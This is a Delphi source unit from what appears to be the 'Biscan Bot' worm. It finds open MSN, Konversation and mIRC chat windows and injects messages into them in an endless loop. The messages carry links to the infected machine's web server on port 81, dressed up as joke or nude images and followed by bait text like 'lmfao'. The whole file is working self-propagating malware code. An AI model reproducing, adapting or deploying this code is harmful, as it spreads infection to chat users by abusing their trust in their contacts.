(* Biscan Bot: Coded by p0ke *)
{ -- http://p0ke.no-ip.com -- }

unit pIMS;

interface

Uses
  pFunc, Windows, Messages, Winsock;

Var
  Buf   :Array[0..40000] Of Char;
  Buff  :Array[0..40000] Of Char;

  Wins: Array[0..300] Of Record
    Name: String;
    Wnd : Hwnd;
  End;
  WCNT : Integer = 0;

  Procedure Infect(Title: String);
  Procedure msn;

implementation

function my_ip_address : longint;
var
  RemoteHost : PHostEnt;
  res:longint;
begin
  winsock.gethostname(@buf, 255);
  RemoteHost:=Winsock.GetHostByName(buf);
  if RemoteHost=NIL then
    res:=winsock.htonl($7F000001)
  else
  res:=longint(pointer(RemoteHost^.h_addr_list^)^);
  result:=winsock.ntohl(res);
end;

function iptostr(ip:longint):string;
var res2:array[1..4]of byte absolute ip;
begin
  result:=inttostr(res2[4])+'.'+inttostr(res2[3])+'.'+inttostr(res2[2])+'.'+inttostr(res2[1]);
end;

Function EnumWinProc(W: Hwnd; Lpr: LParam): Bool; Stdcall;
Begin
  If IsWindowVisible(W) Then
  Begin
    GetWindowText(W, Buf, 10000);
    If Buf[0] <> #0 Then
    Begin
      Wins[WCNT].Name := Buf;
      Wins[WCNT].Wnd := W;
      inc(WCNT);
    End;
  End;
  Result := True;
End;

procedure InfectMirc(mWnd: Hwnd);
Var
  mData: Pointer;
  hFileMap: Cardinal;
  S: String;
Begin
  S := '//ame http://' + IpToStr(My_ip_address) + ':81/';

  Randomize;
  Case Random(10) Of
    0:Insert('Britney.jpg', S, Length(S)+1);
    1:Insert('Funny.jpg', S, Length(S)+1);
    2:Insert('Haha.jpg', S, Length(S)+1);
    3:Insert('Latest_Tests.jpg', S, Length(S)+1);
    4:Insert('Install.jpg', S, Length(S)+1);
    5:Insert('Setup.jpg', S, Length(S)+1);
    6:Insert('Addon.jpg', S, Length(S)+1);
    7:Insert('test.jpg', S, Length(S)+1);
    8:Insert('heh.jpg', S, Length(S)+1);
    9:Insert('OMG.jpg', S, Length(S)+1);
  End;
  Insert('  heh :p', S, Length(S)+1);

  If mWnd > 0 Then
  Begin
    MakeWindowActive(mWnd);
    hFileMap := CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, pChar('mIRC'));
    mData := MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    Move(S[1], mData^, Length(S));
    SendMessage(mWnd, WM_USER+200, 1, 0);
    SendMessage(mWnd, WM_USER+201, 1, 0);
    UnMapViewOfFile(mData);
    CloseHandle(hFileMap);
  End;
End;

Procedure GetWindows;
Var
  I: Integer;
Begin
  WCNT := 0;
  EnumWindows(@EnumWinProc, 0);
  For I := 0 To WCNT -1 Do
  Begin
    If Pos(' - konversation', lowercase(Wins[I].Name)) > 0 Then Infect(Wins[I].Name);
    If Pos(' - conversation', lowercase(Wins[I].Name)) > 0 Then Infect(Wins[I].Name);
    If Pos('mIRC', Wins[I].Name) > 0 Then InfectMirc(Wins[I].Wnd);
    If Pos(' - message session', lowercase(Wins[I].Name)) > 0 Then Infect(Wins[I].Name);
    Wins[I].Name := '';
    Wins[I].Wnd := 0;
    Sleep(1024);
  End;
End;

Procedure Infect(Title: String);
Var
  I: Integer;
  D: HWND;
  Path: String;
  A : Array[0..255] Of Char;
Begin
  Path := 'http://' + IpToStr(My_ip_address) + ':81/';

  Randomize;
  Case Random(10) Of
    0:Insert('Britney.jpg', Path, Length(Path)+1);
    1:Insert('Funny.jpg', Path, Length(Path)+1);
    2:Insert('Haha.jpg', Path, Length(Path)+1);
    3:Insert('celebxxx_joke.jpg', Path, Length(Path)+1);
    4:Insert('windowsInstall.jpg', Path, Length(Path)+1);
    5:Insert('Setup_error.jpg', Path, Length(Path)+1);
    6:Insert('Addon.jpg', Path, Length(Path)+1);
    7:Insert('nude.jpg', Path, Length(Path)+1);
    8:Insert('heh.jpg', Path, Length(Path)+1);
    9:Insert('OMG.jpg', Path, Length(Path)+1);
  End;

  D := GetHandleFromWindowTitle(Title);
  MakeWindowActive(D);

  SendKey(Path);
  If Pos(' - message session', lowercase(Title)) > 0 Then
    SendKey(#254'S'#255)
  Else
    SendKey(#13);

  Case Random(8) Of
    0:Path := ':) heh';
    1:Path := 'lmfao';
    2:Path := 'WoW....';
    3:Path := ';p hah';
    4:Path := 'WTF ;D';
    5:Path := 'hahaha';
    6:Path := 'LOL!!';
    7:Path := 'Rofl :D';
  End;
  SendKey(Path);
  If Pos(' - message session', lowercase(Title)) > 0 Then
    SendKey(#254'S'#255)
  Else
    SendKey(#13);

  SetWindowText(D, pChar('--Biscan--'));
end;

Procedure msn;
Var
  Tmp   :String;
  Win   :String;
Label
  D;
Begin
D:
  GetWindows;
Goto D;
End;

end.
